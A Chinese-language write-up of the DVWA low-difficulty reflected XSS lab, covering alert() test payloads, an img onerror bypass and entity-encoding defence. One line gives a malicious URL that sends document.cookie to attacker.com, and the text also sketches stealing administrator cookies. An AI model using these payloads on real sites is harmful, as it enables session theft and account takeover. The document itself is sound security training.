DVWA-Low-反射型XSS (XSS Reflected)

2026年10月2日 DVWA Web安全 XSS 跨站脚本攻击

一、题目信息

  • 题目名称：DVWA XSS (Reflected) (Low)
  • 题目平台：DVWA (本地 Docker / 灵境靶场)
  • 题目类型：Web安全 / 跨站脚本攻击 / 反射型 XSS
  • 靶场链接：http://192.168.242.80/vulnerabilities/xss_r/
  • 涉及工具：Google Chrome 浏览器

二、解题步骤

1. 分析题目考什么

本题的核心考点是反射型 XSS（Reflected Cross-Site Scripting）。后端代码将用户输入的名字直接拼接到 HTML 页面中并返回给浏览器，没有进行 HTML 实体编码。浏览器收到响应后，将其当作正常的 HTML/JavaScript 代码解析并执行，从而导致脚本注入。

2. 怎么想（破题思路）

  • 在输入框中输入普通文本（如 test），点击 Submit。
  • 页面回显 Hello test，说明输入被直接输出到了页面。
  • 尝试输入 HTML 标签，如 <h1>test</h1>，如果页面显示了大号字体的标题，说明 HTML 标签被解析。
  • 进一步输入 JavaScript 代码，如 <script>alert(1)</script>，验证脚本是否执行。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录：Chrome 浏览器拦截了脚本弹窗

踩坑情况：在输入框中输入 <script>alert(1)</script> 并提交后，页面没有弹窗，或者页面直接空白。

原因分析：现代浏览器（特别是 Chrome）内置了 XSS 审计器。当它在 URL 或页面中发现明显的 <script> 标签时，会出于安全考虑直接拦截其执行。

改进方式：换一个不需要 <script> 标签的 Payload。使用 <img src=x onerror=alert(1)>，利用图片加载失败的事件来触发弹窗，这种形式通常不会被浏览器拦截。

详细实操步骤（Payload逐字解释）

第一步：验证 XSS 漏洞

在输入框中输入：<script>alert('XSS')</script>

响应结果：页面弹出提示框，内容为 XSS。如果被拦截，更换以下 Payload。

第二步：使用 img 标签绕过拦截

在输入框中输入：<img src=x onerror=alert(1)>

逐个字符解释：

  • <img>：HTML 的图片标签。
  • src=x：指定图片的地址为 x，这显然是一个不存在的图片地址。
  • onerror=alert(1)：当图片加载失败（触发 error 事件）时，执行 alert(1) 弹窗。

响应结果：页面成功弹出提示框。这就是反射型 XSS 的威力——攻击者可以构造一个包含恶意脚本的链接发给受害者，受害者点击后就会执行脚本。

4. 怎么迁移（跨领域联想）

  • 钓鱼攻击：攻击者可以构造一个恶意 URL，如 http://example.com/?name=<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>，诱导管理员点击，从而窃取管理员的 Cookie。
  • 水坑攻击：攻击者在热门网站留言板插入反射型 XSS 链接，等待其他用户点击，从而批量获取用户信息。

三、名词大全与原理深度复盘

1. 跨站脚本攻击 (XSS)

攻击者将恶意的 JavaScript 代码注入到网页中，当其他用户浏览该网页时，恶意代码就会在他们的浏览器上执行。XSS 通常分为三类：反射型、存储型和 DOM 型。

2. 反射型 XSS

恶意代码作为请求的一部分发送给服务器，服务器将其“反射”回响应中，浏览器执行代码。它是一次性的，必须诱导受害者点击特定链接才能触发。

3. HTML 实体编码

防御 XSS 的核心手段。将特殊字符（如 <、>、&、"）转换为对应的 HTML 实体（如 &lt;、&gt;、&amp;、&quot;）。这样浏览器就不会把它们当作代码解析，而是当作纯文本显示。

4. 反射型、存储型与 DOM 型的区别

  • 反射型：服务器直接返回恶意代码，一次触发。
  • 存储型：恶意代码被保存在数据库（如留言板），所有访问该页面的用户都会触发。
  • DOM 型：服务器不返回恶意代码，是前端 JavaScript 从 URL 读取并执行了恶意代码。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 SQL 注入的区别：SQL 注入攻击的是服务器数据库，XSS 攻击的是浏览页面的用户。SQL 注入窃取数据，XSS 窃取用户凭证或发起钓鱼。
  • 与 CSRF 的区别：CSRF 是伪造用户的请求，XSS 是执行用户的脚本。XSS 可以配合 CSRF 使用，例如利用 XSS 自动提交 CSRF 表单。

2. 这种题目的出现原因（为什么存在）

漏洞存在的根本原因在于开发者直接将用户输入输出到了页面中，而没有进行 HTML 实体编码。这源于早期 Web 开发中“展示内容”与“执行代码”的边界不清晰。

从历史角度看，XSS 是 Web 2.0 时代最流行的漏洞之一，至今依然常年位居 OWASP Top 10。即便是大厂，也时不时会出现 XSS 漏洞。

3. 这种的应用

在护网中，XSS 是攻击后台管理员的核心手段。攻击者通过 XSS 获取管理员的 Cookie，登录后台后寻找文件上传点，最终拿下服务器。

4. 如何抽象理解概念（大白话）

把反射型 XSS 比作“快递里塞传单”：

  • 正常情况：你给朋友寄快递，里面只放了一本书（正常文本）。朋友收到后翻看。
  • 恶意情况：你在快递里塞了一张“把钥匙扔下楼”的纸条（恶意脚本）。如果朋友完全听纸条的话，他就会把钥匙扔下楼（脚本执行）。这就是反射型 XSS——需要一次特定的“快递”投递。
